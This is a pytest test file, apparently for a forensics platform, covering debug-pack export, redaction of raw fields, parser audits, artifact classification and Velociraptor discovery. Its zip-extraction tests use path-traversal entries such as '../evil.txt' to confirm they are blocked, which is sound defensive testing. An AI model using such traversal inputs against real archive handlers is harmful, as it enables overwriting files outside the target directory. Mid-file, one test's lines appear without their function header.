    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [], "stats": {}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    report = json.loads(archive.read("noise_reduction_report.json").decode("utf-8"))
    assert report["events_reviewed"] == 1
    assert report["events_adjusted"] == 1
    assert report["known_good_counts"]["benign_microsoft_signed"] == 1
    assert report["risk_distribution_before"]["70"] == 1
    assert report["risk_distribution_after"]["20"] == 1


def test_generate_debug_pack_selected_events_includes_selected_jsonl(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="selected_events", event_ids=["evt-1"])
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: [{"id": "evt-1", "event_id": "evt-1", "artifact": {"type": "lnk", "parser": "lnk_raw"}, "event": {"type": "file_opened", "timeline_include": False}, "search_text": "x", "raw_summary": "y"}])
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [], "stats": {}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    assert "selected_events.jsonl" in archive.namelist()


def test_generate_debug_pack_excludes_raw_by_default_and_keeps_ui_context(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(
        scope="search",
        ui_context={"page": "Search", "search_query": "4624", "selected_case": "case-1"},
    )
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: [{
        "id": "evt-1",
        "event_id": "evt-1",
        "artifact": {"type": "windows_event", "parser": "evtx_raw"},
        "event": {"type": "logon_success", "timeline_include": True},
        "raw": {"RawXml": "<xml>secret</xml>", "Password": "hunter2"},
        "search_text": "test",
        "raw_summary": "summary",
    }])
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [], "stats": {}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    normalized = archive.read("normalized_events_sample.jsonl").decode("utf-8")
    assert '"raw"' not in normalized
    ui_context = json.loads(archive.read("ui_context.json").decode("utf-8"))
    assert ui_context["page"] == "Search"
    assert ui_context["search_query"] == "4624"


def test_generate_debug_pack_include_full_raw_adds_warning_not_full_raw(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="case", include_full_raw=True)
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [], "stats": {}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    manifest = json.loads(archive.read("manifest.json").decode("utf-8"))
    assert any("include_full_raw" in warning for warning in manifest["warnings"])


def test_generate_debug_pack_does_not_rebuild_semiauto_inline(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="evidence")
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [], "stats": {}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    semiauto = json.loads(archive.read("semiauto_analysis.json").decode("utf-8"))
    assert "warnings" in semiauto
    assert any("rebuild_semiauto_for_export=true" in warning for warning in semiauto["warnings"])


def test_safe_findings_count_returns_zero_and_warning_on_schema_issue(monkeypatch: pytest.MonkeyPatch) -> None:
    from app.services.debug_export import _safe_findings_count

    class BrokenSession:
        def execute(self, *args, **kwargs):  # noqa: ANN002, ANN003
            raise RuntimeError("column findings.detection_ids does not exist")

    warnings: list[str] = []
    value = _safe_findings_count(BrokenSession(), "case-1", warnings)
    assert value == 0
    assert warnings
    assert "findings count failed" in warnings[0]


def test_debug_export_source_fields_omit_raw_and_search_text_by_default() -> None:
    from app.services.debug_export import _debug_export_source_fields

    fields = _debug_export_source_fields(include_raw_samples=False, include_raw_xml=False)
    assert "raw" not in fields
    assert "search_text" not in fields
    assert "raw_summary" in fields


def test_debug_export_source_fields_include_raw_when_requested() -> None:
    from app.services.debug_export import _debug_export_source_fields

    fields = _debug_export_source_fields(include_raw_samples=True, include_raw_xml=True)
    assert "raw" in fields
    assert "raw.RawXml" in fields


def test_generate_debug_pack_manifest_differentiates_totals_and_exported(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="evidence", evidence_id="evidence-1")
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: {"sampled_events": [{"id": "evt-1", "artifact": {"type": "powershell", "parser": "transcript"}, "event": {"type": "powershell_script"}, "search_text": "x", "raw_summary": "y"}], "total_events": 21896, "evtx_classification_sample": []})
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [{"rule_id": "builtin.x", "rule_name": "X"}])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [], "stats": {"indexed_events": 21896}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    monkeypatch.setattr("app.services.debug_export._collect_scope_counts", lambda context, scope_query: (10, 5))
    monkeypatch.setattr("app.services.debug_export._count_rules_matches", lambda db, context: 472)
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    manifest = json.loads(archive.read("manifest.json").decode("utf-8"))
    assert manifest["counts"]["indexed_events_total"] == 21896
    assert manifest["counts"]["normalized_events_total"] == 21896
    assert manifest["counts"]["normalized_events_exported"] == 1
    assert manifest["counts"]["rules_matches_total"] == 472
    assert manifest["counts"]["rules_matches_exported"] == 1


def test_generate_debug_pack_includes_evtx_raw_sample_and_classification_sample(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="evidence", evidence_id="evidence-1")
    evtx_event = {
        "id": "evt-evtx-1",
        "event_id": "evt-evtx-1",
        "case_id": "case-1",
        "evidence_id": "evidence-1",
        "source_file": "Security.evtx",
        "source_tool": "native_evtx",
        "source_format": "evtx",
        "@timestamp": "2026-05-12T12:00:00Z",
        "artifact": {"type": "windows_event", "parser": "evtx_raw"},
        "event": {"category": "authentication", "type": "logon_success", "timeline_include": True, "severity": "info", "message": "4624"},
        "windows": {"event_id": 4624, "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing", "event_data_summary": "Logon"},
        "raw_summary": "Provider=Security",
        "search_text": "Security 4624",
    }
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: {"sampled_events": [evtx_event], "total_events": 10, "evtx_classification_sample": [evtx_event]})
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [], "stats": {"indexed_events": 10}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    monkeypatch.setattr("app.services.debug_export._collect_scope_counts", lambda context, scope_query: (1, 0))
    monkeypatch.setattr("app.services.debug_export._count_rules_matches", lambda db, context: 0)
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    normalized = archive.read("normalized_events_sample.jsonl").decode("utf-8")
    evtx_sample = archive.read("evtx_classification_sample.jsonl").decode("utf-8")
    assert '"parser": "evtx_raw"' in normalized
    assert '"source_tool": "native_evtx"' in normalized
    assert '"event_id": 4624' in evtx_sample


def test_build_parser_audit_for_evtx_infers_filtered_reason_when_read_but_zero_elsewhere() -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(id="evidence-1", case_id="case-1", original_filename="sample.zip", stored_path="sample.zip", evidence_type=EvidenceType.parsed_folder, sha256="00", size_bytes=1, ingest_status=IngestStatus.completed, metadata_json={}, error_log={})
    context = _DebugPackContext(case=case, evidences=[evidence], request=DebugExportRequest(scope="evidence"), export_timestamp=datetime.now(UTC))
    manifests = {
        "evidence-1": {
            "artifacts": [
                {
                    "parser": "evtx_raw",
                    "artifact_type": "windows_event",
                    "source_path": "Microsoft-Windows-PowerShell/Operational.evtx",
                    "status": "completed",
                    "record_count": 0,
                    "ingest_audit": {"records_read": 492, "events_indexed": 0, "records_parsed": 0, "records_skipped": 0, "records_failed": 0},
                }
            ]
        }
    }
    rows = _build_parser_audit(context, manifests)
    assert rows[0]["records_read"] == 492
    assert rows[0]["records_filtered"] == 492
    assert rows[0]["filter_reason"] == "no_events_after_filter"
    assert rows[0]["records_unprocessed"] == 0
    assert rows[0]["records_accounting_formula"] == "records_read = records_parsed + records_filtered + records_failed + records_unprocessed"


def test_collect_rules_matches_generates_stable_rule_id_and_fields(monkeypatch: pytest.MonkeyPatch) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(id="evidence-1", case_id="case-1", original_filename="sample.zip", stored_path="sample.zip", evidence_type=EvidenceType.parsed_folder, sha256="00", size_bytes=1, ingest_status=IngestStatus.completed, metadata_json={}, error_log={})
    detection = DetectionResult(
        case_id="case-1",
        evidence_id="evidence-1",
        artifact_id=None,
        rule_id=None,
        rule_set_id=None,
        engine="builtin",
        source_engine="builtin",
        rule_name="Scheduled Task Persistence",
        severity="medium",
        confidence=None,
        event_id="evt-1",
        event_index=None,
        opensearch_id=None,
        target_type="event",
        target_path=None,
        message="Matched scheduled task path",
        raw={"namespace": "builtin", "matched_values": {"task.path": "\\\\Test"}, "enabled": True},
        status="new",
    )

    class DetectionSession(_FakeSession):
        def query(self, model):  # noqa: ANN001
            if model is DetectionResult:
                return _FakeQuery([detection])
            return super().query(model)

    session = DetectionSession(case, [evidence])
    context = _DebugPackContext(case=case, evidences=[evidence], request=DebugExportRequest(scope="evidence"), export_timestamp=datetime.now(UTC))
    monkeypatch.setattr("app.services.debug_export.fetch_event_by_id", lambda *args, **kwargs: {"id": "evt-1", "artifact": {"type": "scheduled_task", "parser": "xml"}, "event": {"message": "Task created"}, "source_file": "task.xml", "tags": ["persistence"], "search_text": "x", "raw_summary": "y"})
    rows = _collect_rules_matches(session, context, context.request)
    assert rows[0]["rule_id"] == "builtin.Scheduled.Task.Persistence"
    assert rows[0]["matched_fields"] == ["task.path"]
    assert rows[0]["artifact_type"] == "scheduled_task"
    assert rows[0]["source_file"] == "task.xml"


def test_collect_rules_matches_uses_builtin_fields_consulted_when_raw_fields_missing(monkeypatch: pytest.MonkeyPatch) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(id="evidence-1", case_id="case-1", original_filename="sample.zip", stored_path="sample.zip", evidence_type=EvidenceType.parsed_folder, sha256="00", size_bytes=1, ingest_status=IngestStatus.completed, metadata_json={}, error_log={})
    detection = DetectionResult(
        case_id="case-1",
        evidence_id="evidence-1",
        artifact_id=None,
        rule_id=None,
        rule_set_id=None,
        engine="builtin",
        source_engine="builtin",
        rule_name="Service installation",
        severity="high",
        confidence=None,
        event_id="evt-1",
        event_index=None,
        opensearch_id=None,
        target_type="event",
        target_path=None,
        message="Service install detected",
        raw={"namespace": "builtin", "enabled": True},
        status="new",
    )

    class DetectionSession(_FakeSession):
        def query(self, model):  # noqa: ANN001
            if model is DetectionResult:
                return _FakeQuery([detection])
            return super().query(model)

    session = DetectionSession(case, [evidence])
    context = _DebugPackContext(case=case, evidences=[evidence], request=DebugExportRequest(scope="evidence"), export_timestamp=datetime.now(UTC))
    monkeypatch.setattr(
        "app.services.debug_export.fetch_event_by_id",
        lambda *args, **kwargs: {
            "id": "evt-1",
            "artifact": {"type": "windows_event", "parser": "evtx_raw"},
            "event": {"message": "7045 service installed"},
            "source_file": "System.evtx",
            "tags": ["service_install", "persistence"],
            "service": {"name": "BadSvc", "image_path": "C:\\Users\\dfir\\AppData\\Local\\bad.exe"},
            "search_text": "x",
            "raw_summary": "y",
        },
    )
    rows = _collect_rules_matches(session, context, context.request)
    assert "service.name" in rows[0]["matched_fields"]
    assert "service.image_path" in rows[0]["matched_fields"]


def test_build_evtx_classification_report_marks_not_applicable_without_native_evtx() -> None:
    from app.services.debug_export import _build_evtx_classification_report

    report = _build_evtx_classification_report([], [])
    assert report["not_applicable_reason"] == "No native EVTX raw events found in this export scope"
    assert report["classification_guardrails"]["security_logon_requires_security_channel"] == "not_applicable"


def test_build_evtx_classification_report_collects_providers_from_events() -> None:
    report = _build_evtx_classification_report(
        [{"parser_name": "evtx_raw", "records_read": 1, "records_indexed": 1, "records_filtered": 0, "records_failed": 0, "providers_seen": []}],
        [{"windows": {"provider": "Microsoft-Windows-Security-Auditing", "channel": "Security", "event_id": 4624}, "event": {"type": "logon_success", "category": "authentication"}, "source_file": "Security.evtx", "data_quality": []}],
    )
    assert "Microsoft-Windows-Security-Auditing" in report["providers_seen"]


def test_build_evtx_classification_report_uses_discovery_candidates_when_evtx_selected() -> None:
    report = _build_evtx_classification_report(
        [],
        [],
        discovery_candidates=[
            {
                "category": "evtx",
                "normalized_windows_path": "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx",
                "selected_for_extraction": True,
                "supported": True,
                "parser_status": "ready",
            }
        ],
        selected_artifact_types=["powershell", "evtx"],
    )
    assert report["total_evtx_files_seen"] == 1
    assert report["total_evtx_files_parseable"] == 1
    assert report["evtx_candidates_from_discovery"] == 1
    assert report["evtx_candidates_selected"] == 1
    assert report["not_applicable_reason"] is None


def test_generate_debug_pack_omits_windows_raw_xml_when_not_requested(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="evidence", evidence_id="evidence-1", include_raw_xml=False)
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: {"sampled_events": [{
        "id": "evt-1",
        "event_id": "evt-1",
        "artifact": {"type": "windows_event", "parser": "evtx_raw"},
        "event": {"type": "logon_success", "timeline_include": True},
        "windows": {"event_id": 4624, "provider": "Microsoft-Windows-Security-Auditing", "raw_xml": "<Event>secret</Event>"},
        "search_text": "test",
        "raw_summary": "summary",
    }], "total_events": 1, "evtx_classification_sample": []})
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [], "stats": {}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    monkeypatch.setattr("app.services.debug_export._collect_scope_counts", lambda context, scope_query: (1, 0))
    monkeypatch.setattr("app.services.debug_export._count_rules_matches", lambda db, context: 0)
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    normalized = archive.read("normalized_events_sample.jsonl").decode("utf-8")
    assert "raw_xml" not in normalized
    assert "RawXml" not in normalized


def test_build_parser_audit_for_evtx_uses_records_unprocessed_for_gap() -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(id="evidence-1", case_id="case-1", original_filename="sample.zip", stored_path="sample.zip", evidence_type=EvidenceType.parsed_folder, sha256="00", size_bytes=1, ingest_status=IngestStatus.completed, metadata_json={}, error_log={})
    context = _DebugPackContext(case=case, evidences=[evidence], request=DebugExportRequest(scope="evidence"), export_timestamp=datetime.now(UTC))
    manifests = {
        "evidence-1": {
            "artifacts": [
                {
                    "parser": "evtx_raw",
                    "artifact_type": "windows_event",
                    "source_path": "System.evtx",
                    "status": "completed",
                    "record_count": 0,
                    "ingest_audit": {"records_read": 100, "records_parsed": 80, "events_indexed": 80, "records_filtered": 5, "records_failed": 5},
                }
            ]
        }
    }
    rows = _build_parser_audit(context, manifests)
    assert rows[0]["records_unprocessed"] == 10
    assert rows[0]["records_read"] == (rows[0]["records_parsed"] + rows[0]["records_filtered"] + rows[0]["records_failed"] + rows[0]["records_unprocessed"])


def test_build_dedup_report_examples_include_artifact_and_source_file() -> None:
    report = _build_dedup_report([
        {
            "id": "evt-1",
            "case_id": "case-1",
            "evidence_id": "evidence-1",
            "source_file": "Security.evtx",
            "@timestamp": "2026-05-12T12:00:00Z",
            "artifact": {"type": "windows_event", "parser": "evtx_raw"},
            "source_tool": "native_evtx",
            "windows": {"channel": "Security", "record_id": 1, "event_id": 4624},
            "event": {"type": "logon_success"},
        },
        {
            "id": "evt-2",
            "case_id": "case-1",
            "evidence_id": "evidence-1",
            "source_file": "Security.evtx",
            "@timestamp": "2026-05-12T12:00:00Z",
            "artifact": {"type": "windows_event", "parser": "evtx_raw"},
            "source_tool": "native_evtx",
            "windows": {"channel": "Security", "record_id": 1, "event_id": 4624},
            "event": {"type": "logon_success"},
        },
    ])
    assert report["examples"]
    assert report["examples"][0]["artifact.type"] == "windows_event"
    assert report["examples"][0]["source_files"] == ["Security.evtx"]


def test_collect_semiauto_analysis_prefers_cache_and_can_rebuild(monkeypatch: pytest.MonkeyPatch) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(id="evidence-1", case_id="case-1", original_filename="sample.zip", stored_path="sample.zip", evidence_type=EvidenceType.parsed_folder, sha256="00", size_bytes=1, ingest_status=IngestStatus.completed, metadata_json={}, error_log={})
    cached_job = CaseAnalysisJob(case_id="case-1", analysis_type="semi_auto", status="completed", result_json={"sections": {"x": [1]}, "counts": {"x": 1}, "activities": []})

    class SemiAutoSession(_FakeSession):
        def __init__(self, case: Case, evidences: list[Evidence], jobs: list[CaseAnalysisJob]) -> None:
            super().__init__(case, evidences)
            self._jobs = jobs
        def query(self, model):  # noqa: ANN001
            if model is CaseAnalysisJob:
                return _FakeQuery(self._jobs)
            return super().query(model)

    session = SemiAutoSession(case, [evidence], [cached_job])
    context = _DebugPackContext(case=case, evidences=[evidence], request=DebugExportRequest(scope="case"), export_timestamp=datetime.now(UTC))
    cached = _collect_semiauto_analysis(session, context)
    assert cached["sections"]["x"] == [1]

    rebuild_context = _DebugPackContext(case=case, evidences=[evidence], request=DebugExportRequest(scope="case", include_cached_semiauto=False, rebuild_semiauto_for_export=True), export_timestamp=datetime.now(UTC))
    monkeypatch.setattr("app.services.debug_export.build_case_semi_auto_analysis", lambda case_id: {"sections": {"rebuilt": [1]}, "counts": {"rebuilt": 1}, "activities": []})
    rebuilt = _collect_semiauto_analysis(session, rebuild_context)
    assert rebuilt["sections"]["rebuilt"] == [1]
    pcap.write_text("", encoding="utf-8")
    yara = tmp_path / "rules.yara"
    yara.write_text("rule x {}", encoding="utf-8")
    sigma = tmp_path / "sigma.yml"
    sigma.write_text("title: x\ndetection:\n  sel: {}\nlogsource: {}", encoding="utf-8")
    assert detect_evidence_type(evtx).value == "evtx"
    assert detect_evidence_type(mem).value == "memory_dump"
    assert detect_evidence_type(pcap).value == "pcap"
    assert detect_evidence_type(yara).value == "yara_rules"
    assert detect_evidence_type(sigma).value == "sigma_rules"


def test_secure_zip_extraction_blocks_traversal(tmp_path: Path) -> None:
    archive_path = tmp_path / "unsafe.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("../evil.txt", "x")
    dest = tmp_path / "dest"
    try:
        extract_archive(archive_path, dest)
    except ValueError as exc:
        assert "Unsafe" in str(exc) or "Absolute" in str(exc)
    else:
        raise AssertionError("Expected unsafe extraction to fail")


def test_zip_extraction_ignores_macos_artifacts(tmp_path: Path) -> None:
    archive_path = tmp_path / "safe.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("__MACOSX/ignored.txt", "x")
        archive.writestr(".DS_Store", "x")
        archive.writestr("._hidden", "x")
        archive.writestr("real/file.txt", "ok")
    dest = tmp_path / "dest"
    files, manifest = extract_archive(archive_path, dest)
    assert files == ["real/file.txt"]
    assert any(item["ignored"] for item in manifest)
    extracted_entry = next(item for item in manifest if item["path"] == "real/file.txt")
    assert extracted_entry["status"] == "extracted"
    assert extracted_entry["local_path"] == str(dest / "real/file.txt")
    ignored_entry = next(item for item in manifest if item["path"] == "__MACOSX/ignored.txt")
    assert ignored_entry["status"] == "ignored"
    assert ignored_entry["local_path"] is None


def test_zip_extraction_ignores_appledouble_evtx_noise(tmp_path: Path) -> None:
    archive_path = tmp_path / "evtx-noise.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("__MACOSX/Logs/._Security.evtx", "noise")
        archive.writestr("Logs/._System.evtx", "noise")
        archive.writestr("Logs/Security.evtx", "real")
    dest = tmp_path / "dest"
    files, manifest = extract_archive(archive_path, dest)
    assert files == ["Logs/Security.evtx"]
    ignored_paths = {item["path"]: item["reason"] for item in manifest if item["status"] == "ignored"}
    assert ignored_paths["__MACOSX/Logs/._Security.evtx"] == "ignored_macos_directory"
    assert ignored_paths["Logs/._System.evtx"] == "ignored_appledouble_resource_fork"


def test_sanitize_relative_path_rejects_traversal() -> None:
    try:
        sanitize_relative_path("../evil/file.txt")
    except ValueError as exc:
        assert "Parent path traversal" in str(exc)
    else:
        raise AssertionError("Expected traversal sanitization to fail")


def test_artifact_classification_prefetch() -> None:
    result = classify_artifact(Path("PECmd_Output.csv"), ["ExecutableName", "LastRun"])
    assert result["artifact_type"] == "prefetch"


def test_artifact_classification_lecmd() -> None:
    result = classify_artifact(Path("LECmd_Output.csv"), ["SourceFile", "TargetPath", "Arguments", "MachineID"])
    assert result["artifact_type"] == "lnk"
    assert result["parser"] == "zimmerman"


def test_artifact_classification_jlecmd() -> None:
    result = classify_artifact(Path("JLECmd_Output.csv"), ["SourceFile", "AppId", "AppIdDescription", "Path", "InteractionCount"])
    assert result["artifact_type"] == "jumplist"
    assert result["parser"] == "zimmerman"


def test_artifact_classification_recmd() -> None:
    result = classify_artifact(Path("RECmd_Output.csv"), ["SourceFile", "Hive", "KeyPath", "ValueName", "ValueData", "LastWriteTime"])
    assert result["artifact_type"] == "registry"
    assert result["parser"] == "zimmerman"


def test_artifact_classification_mftecmd() -> None:
    result = classify_artifact(Path("MFTECmd_Output.csv"), ["EntryNumber", "SequenceNumber", "ParentEntryNumber", "FileName", "FullPath", "SourceFile"])
    assert result["artifact_type"] == "mft"
    assert result["parser"] == "zimmerman"


def test_artifact_classification_mftecmd_usn_headers() -> None:
    result = classify_artifact(Path("journal.csv"), ["Timestamp", "FileReference", "ParentFileReference", "Reason", "FilePath", "Usn"])
    assert result["artifact_type"] == "usn"
    assert result["parser"] == "zimmerman"


def test_artifact_classification_scheduled_tasks_csv() -> None:
    result = classify_artifact(Path("ScheduledTasks.csv"), ["TaskName", "TaskPath", "Author", "Command", "Arguments", "Enabled"])
    assert result["artifact_type"] == "scheduled_task"
    assert result["parser"] == "csv"


def test_artifact_classification_shellbags_csv() -> None:
    result = classify_artifact(Path("SBECmd_Output.csv"), ["BagPath", "AbsolutePath", "ShellType", "MRUPosition", "LastWriteTime", "SourceFile", "HivePath"])
    assert result["artifact_type"] == "shellbags"
    assert result["parser"] in {"sbecmd", "csv"}


def test_shellbags_detector_does_not_misclassify_prefetch_named_after_sbecmd() -> None:
    result = classify_artifact(Path("SBECMD.EXE-DF8EAD0F.pf"))
    assert result["artifact_type"] != "shellbags"


def test_velociraptor_discovery_detects_scheduled_task_xml(tmp_path: Path) -> None:
    task_dir = tmp_path / "uploads" / "auto" / "C%3A" / "Windows" / "System32" / "Tasks" / "Microsoft" / "Windows" / "UpdateOrchestrator"
    task_dir.mkdir(parents=True)
    source = Path(__file__).parent / "fixtures" / "scheduled_tasks" / "benign_windows_update.xml"
    task_file = task_dir / "Schedule Scan"
    task_file.write_text(source.read_text(encoding="utf-8"), encoding="utf-8")
    discovery = discover_velociraptor_evidences(tmp_path)
    candidate = next(item for item in discovery.candidates if item.category == "scheduled_task")
    assert candidate.supported is True
    assert candidate.parser_status == "ready"
    assert candidate.artifact_type == "scheduled_task"
    assert candidate.task_name == "Schedule Scan"
    assert candidate.task_path == "\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan"
    assert candidate.normalized_windows_path == "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan"


def test_velociraptor_discovery_detects_shellbags_raw_hives() -> None:
    root = Path(__file__).parent / "fixtures" / "shellbags" / "velociraptor_collection_shellbags"
    discovery = discover_velociraptor_evidences(root)
    shellbag_candidates = [item for item in discovery.candidates if item.category == "shellbags"]
    assert len(shellbag_candidates) >= 2
    ntuser = next(item for item in shellbag_candidates if item.hive_type == "NTUSER.DAT")
    usrclass = next(item for item in shellbag_candidates if item.hive_type == "UsrClass.dat")
    assert ntuser.supported is False
    assert ntuser.parser_status == "detected_not_implemented"
    assert usrclass.user == "alex"
    assert usrclass.normalized_windows_path == "C:\\Users\\alex\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat"


def test_velociraptor_discovery_detects_raw_jumplists() -> None:
